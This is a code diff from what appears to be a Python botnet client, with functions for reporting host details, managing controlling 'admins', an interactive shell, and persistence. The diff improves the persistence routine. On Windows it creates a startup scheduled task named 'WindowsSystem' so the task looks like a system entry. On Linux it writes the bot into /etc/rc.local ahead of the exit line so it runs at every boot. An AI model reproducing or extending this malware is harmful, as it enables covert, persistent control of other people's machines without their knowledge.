@@ -134,12 +134,7 @@ def version(): #determine flavor/version
 	else:
 		sendData("Not sure...")
 
-	output = ""
-	for word in info:
-		output = output + word + " - "
-
-	output = output[:-3]
-	sendData(output)
+	sendData(" - ".join(filter(None,list(info))))
 
 def kernel(): #which kernel version
 	sendData(platform.release())
@@ -244,10 +239,13 @@ def admin(cmd): #add/remove admins
 		sendData("Admins are: " + ", ".join(admins))
 
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
+	print "argv0 is '%s'" % argv[0]
+	print "cwd is '%s'" % os.getcwd()
 	script = os.getcwd() + "\\" + argv[0]
+	print "script is '%s'" % script
 	if operatingSystem == "windows":
 		# sendData("I'm on windows boss...")
-		output = execute("schtasks /Create /SC ONSTART /TN 'Windows System' /TR " + script)
+		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR " + script)
 		sendData(output)
 		return
 	elif operatingSystem == "darwin": #if mac
@@ -264,9 +262,17 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 			return
 
 		if os.access(path, os.W_OK): #check if we have write perms
-			outfile = open(path, 'a')
-			dir = execute("pwd")
-			outfile.write("/usr/bin/env python " + dir.strip() + "/" + argv[0])
+			infile = open(path, "r")
+			lines = infile.readlines()
+			infile.close()
+			outfile = open(path, 'w')
+			for line in lines:
+				if "exit" in line.lower():
+					outfile.write("/usr/bin/env python " + script + " \n")
+					outfile.write(line)
+				else:
+					outfile.write(line)
+
 			sendData("Seems to have worked...")
 		else:
 			sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
@@ -290,7 +296,8 @@ if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 	DEBUG = 1
 
 #other vars
-argv[0] = argv[0][2:]
+if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
+	argv[0] = argv[0][2:]
 operatingSystem = platform.system().lower() #detected os in all lowercase
 INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
 						#index two is the boolean for if the interactive shell is with this bot
